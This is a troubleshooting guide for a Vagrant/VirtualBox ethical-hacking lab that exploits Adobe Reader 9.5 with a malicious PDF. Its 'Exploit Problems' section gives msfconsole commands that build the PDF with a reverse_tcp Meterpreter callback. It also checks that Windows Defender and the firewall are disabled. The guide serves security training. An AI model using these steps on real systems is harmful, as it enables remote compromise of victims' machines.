# Troubleshooting Guide
## Ethical Hacking PDF Exploit Lab

This guide covers common issues and their solutions.

---

## Table of Contents

1. [Setup Issues](#setup-issues)
2. [Network Problems](#network-problems)
3. [VM Issues](#vm-issues)
4. [Exploit Problems](#exploit-problems)
5. [Performance Issues](#performance-issues)
6. [General Tips](#general-tips)

---

## Setup Issues

### Issue: "VirtualBox not found"

**Symptoms:**
```
✗ VirtualBox not found
Please install VirtualBox from: https://www.virtualbox.org/
```

**Solution:**
1. Download VirtualBox from https://www.virtualbox.org/
2. Install for your operating system
3. Restart terminal
4. Run `VBoxManage --version` to verify

**macOS Specific:**
- May need to approve in System Preferences > Security & Privacy
- Reboot after installation

---

### Issue: "Vagrant not found"

**Symptoms:**
```
✗ Vagrant not found
Please install Vagrant from: https://www.vagrantup.com/
```

**Solution:**
1. Download Vagrant from https://www.vagrantup.com/
2. Install for your operating system
3. Restart terminal
4. Run `vagrant --version` to verify

---

### Issue: "Insufficient disk space"

**Symptoms:**
```
✗ Insufficient disk space
Available: 25GB, Required: 40GB
```

**Solutions:**

**Option 1: Free up space**
```bash
# Remove old VirtualBox VMs
VBoxManage list vms
VBoxManage unregistervm <vm-name> --delete

# Clean Vagrant boxes
vagrant box prune

# Clean Docker (if installed)
docker system prune -a
```

**Option 2: Use external drive**
```bash
# Move VirtualBox default machine folder
VBoxManage setproperty machinefolder /path/to/external/drive
```

---

### Issue: "Adobe Reader download fails"

**Symptoms:**
```
✗ Failed to download Adobe Reader
```

**Solutions:**

**Option 1: Manual download**
1. Download from: https://archive.org/download/adobe-reader-9.5/AdbeRdr950_en_US.exe
2. Save to: `resources/AdobeReader_9.5.exe`
3. Re-run `./setup.sh`

**Option 2: Check internet connection**
```bash
# Test connectivity
ping archive.org
curl -I https://archive.org
```

**Option 3: Use alternative source**
- Check INSTALLATION.md for alternative download links
- Verify file size is around 50MB

---

## Network Problems

### Issue: "Kali cannot reach Windows"

**Symptoms:**
```
✗ Kali → Windows: FAILED
```

**Solutions:**

**Step 1: Verify VMs are running**
```bash
cd vagrant
vagrant status

# Should show both running:
# kali     running (virtualbox)
# win2k8   running (virtualbox)
```

**Step 2: Check IP addresses**
```bash
# From Kali
vagrant ssh kali
ip addr show eth1

# Should show: 192.168.56.101
```

**Step 3: Restart network**
```bash
# From Kali
vagrant ssh kali
sudo systemctl restart networking
```

**Step 4: Check VirtualBox network**
```bash
VBoxManage list hostonlyifs

# Should show:
# Name: vboxnet0
# IPAddress: 192.168.56.1
```

**Step 5: Recreate network**
```bash
# Delete old network
VBoxManage hostonlyif remove vboxnet0

# Run setup again
./setup.sh
```

---

### Issue: "Host-only network creation fails"

**Symptoms:**
```
Error creating host-only network
```

**Solutions:**

**Linux:**
```bash
# May need to load kernel module
sudo modprobe vboxnetadp
sudo modprobe vboxnetflt
```

**macOS:**
- Check System Preferences > Security & Privacy
- Allow Oracle system extensions
- Reboot may be required

**Windows:**
- Run as Administrator
- Disable Hyper-V if enabled:
  ```powershell
  bcdedit /set hypervisorlaunchtype off
  ```
- Reboot

---

## VM Issues

### Issue: "Kali VM won't start"

**Symptoms:**
```
Kali VM failed to start
```

**Solutions:**

**Step 1: Check logs**
```bash
cd vagrant
vagrant up kali --debug
```

**Step 2: Increase timeout**
Edit `vagrant/Vagrantfile`:
```ruby
config.vm.boot_timeout = 1200  # Increase to 20 minutes
```

**Step 3: Check virtualization**
```bash
# Linux
egrep -c '(vmx|svm)' /proc/cpuinfo
# Should be > 0

# Enable in BIOS if needed
```

**Step 4: Rebuild VM**
```bash
vagrant destroy kali -f
vagrant up kali
```

---

### Issue: "Windows VM stuck at boot"

**Symptoms:**
- Windows VM shows black screen
- Stuck at "Configuring Windows"

**Solutions:**

**Step 1: Wait longer**
- Windows first boot can take 10-15 minutes
- Watch for disk activity

**Step 2: Increase resources**
Edit `vagrant/Vagrantfile`:
```ruby
vb.memory = "6144"  # Increase to 6GB
vb.cpus = 4         # Increase to 4 CPUs
```

**Step 3: Check VT-x/AMD-V**
```bash
# Ensure virtualization is enabled in BIOS
VBoxManage list hostinfo | grep -i vt-x
```

**Step 4: Rebuild from scratch**
```bash
vagrant destroy win2k8 -f
vagrant box remove rapid7/metasploitable3-win2k8
vagrant up win2k8
```

---

### Issue: "VM snapshot restore fails"

**Symptoms:**
```
Failed to restore snapshot
```

**Solutions:**

**Step 1: List snapshots**
```bash
VBoxManage snapshot "Kali_PDF_Exploit_Lab" list
VBoxManage snapshot "Windows_PDF_Target_Lab" list
```

**Step 2: Manual restore**
```bash
# Stop VM
vagrant halt kali

# Restore snapshot
VBoxManage snapshot "Kali_PDF_Exploit_Lab" restore "Clean_State"

# Start VM
vagrant up kali
```

**Step 3: Recreate snapshot**
```bash
# Delete old snapshot
VBoxManage snapshot "Kali_PDF_Exploit_Lab" delete "Clean_State"

# Create new one
vagrant up kali
VBoxManage snapshot "Kali_PDF_Exploit_Lab" take "Clean_State"
```

---

## Exploit Problems

### Issue: "Malicious PDF not created"

**Symptoms:**
```
✗ Failed to create main PDF
```

**Solutions:**

**Step 1: Check Metasploit**
```bash
vagrant ssh kali
msfconsole --version
```

**Step 2: Update Metasploit**
```bash
vagrant ssh kali
sudo apt update
sudo apt install metasploit-framework
sudo msfdb init
```

**Step 3: Manual PDF generation**
```bash
vagrant ssh kali
msfconsole

# In Metasploit:
use exploit/windows/fileformat/adobe_cooltype_sing
set LHOST 192.168.56.101
set LPORT 4444
set FILENAME test.pdf
exploit
exit
```

**Step 4: Check permissions**
```bash
vagrant ssh kali
mkdir -p ~/.msf4/local
chmod 755 ~/.msf4/local
```

---

### Issue: "Exploit doesn't trigger"

**Symptoms:**
- PDF opens on Windows
- No Meterpreter session received

**Solutions:**

**Step 1: Verify listener is running**
```bash
# On Kali - check if port 4444 is listening
netstat -tlnp | grep 4444
```

**Step 2: Check Windows security**
```bash
# On Windows PowerShell
Get-MpPreference | Select DisableRealtimeMonitoring
# Should be: True

Get-NetFirewallProfile | Select Name, Enabled
# All should be: False
```

**Step 3: Try alternative exploit**
```bash
vagrant ssh kali
cd /vagrant/exploits

# Use alternative PDF
cp ~/.msf4/local/JOAN-ESPINACH-ALT.pdf /vagrant/exploits/
```

**Step 4: Verify Adobe version**
- On Windows, open Adobe Reader
- Help > About Adobe Reader
- Should say: Version 9.5.0

**Step 5: Check network connectivity**
```bash
# From Windows command prompt
ping 192.168.56.101
```

---

### Issue: "Meterpreter session dies immediately"

**Symptoms:**
```
[*] Meterpreter session 1 opened
[*] Session 1 closed
```

**Solutions:**

**Step 1: Use staged payload**
In Metasploit:
```
set PAYLOAD windows/meterpreter/reverse_tcp
# (not reverse_https or reverse_http)
```

**Step 2: Keep Adobe Reader open**
- Don't close PDF immediately
- Leave window open

**Step 3: Increase session timeout**
```
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 600
```

---

## Performance Issues

### Issue: "VMs running very slowly"

**Solutions:**

**Step 1: Check host resources**
```bash
# Linux/Mac
htop

# Windows
Task Manager > Performance
```

**Step 2: Reduce VM resources**
Edit `vagrant/Vagrantfile`:
```ruby
# Kali
vb.memory = "1024"  # Reduce to 1GB
vb.cpus = 1

# Windows
vb.memory = "2048"  # Reduce to 2GB
vb.cpus = 1
```

**Step 3: Disable GUI for Kali**
```ruby
vb.gui = false  # Use SSH only
```

**Step 4: Close other applications**
- Close web browsers
- Stop other VMs
- Disable unnecessary services

---

### Issue: "Lab setup takes forever"

**Solutions:**

**Step 1: Use faster mirror**
```bash
# On Kali, edit /etc/apt/sources.list
# Use closest mirror
```

**Step 2: Download boxes manually**
```bash
# Download boxes first
vagrant box add kalilinux/rolling
vagrant box add rapid7/metasploitable3-win2k8

# Then run setup
./setup.sh
```

**Step 3: Use SSD**
- Move VirtualBox folder to SSD
- Significantly faster than HDD

---

## General Tips

### Enable Verbose Logging

```bash
# For setup script
bash -x ./setup.sh

# For Vagrant
cd vagrant
vagrant up --debug &> vagrant.log
```

### Check System Logs

```bash
# Kali logs
vagrant ssh kali
journalctl -xe

# Windows logs
# Event Viewer > Windows Logs > System
```

### Clean Slate Rebuild

```bash
# Complete cleanup
./cleanup.sh

# Remove everything
rm -rf ~/.vagrant.d/boxes/*
VBoxManage list vms | awk '{print $1}' | xargs -I {} VBoxManage unregistervm {} --delete

# Start fresh
./setup.sh
```

### Get VM Status

```bash
cd vagrant

# Check status
vagrant status

# Check global status
vagrant global-status

# Reload VM configuration
vagrant reload

# Re-provision
vagrant provision
```

---

## Still Having Issues?

### Collect Debugging Information

```bash
# System info
uname -a
VBoxManage --version
vagrant --version

# VM status
cd vagrant
vagrant status

# Network info
VBoxManage list hostonlyifs
ip addr  # or ipconfig on Windows

# Disk space
df -h
```

### Ask for Help

When asking for help, include:

1. Your operating system and version
2. VirtualBox version
3. Vagrant version
4. Error messages (full output)
5. What you've already tried
6. Relevant logs

### Community Resources

- VirtualBox Forums: https://forums.virtualbox.org/
- Vagrant GitHub Issues: https://github.com/hashicorp/vagrant/issues
- Metasploit Slack: https://metasploit.com/slack

---

## Known Limitations

### macOS M1/M2 (ARM)
- VirtualBox doesn't support ARM yet
- Use VMware Fusion or Parallels instead
- Or use cloud-based lab

### Corporate Networks
- May block VM-to-VM communication
- Disable VPN during lab
- Use personal device if possible

### Antivirus Software
- May quarantine Metasploit
- May block malicious PDFs
- Disable AV during lab (host machine only)

---

**Remember: Most issues are resolved by simply re-running `./setup.sh` or `./reset.sh`!**
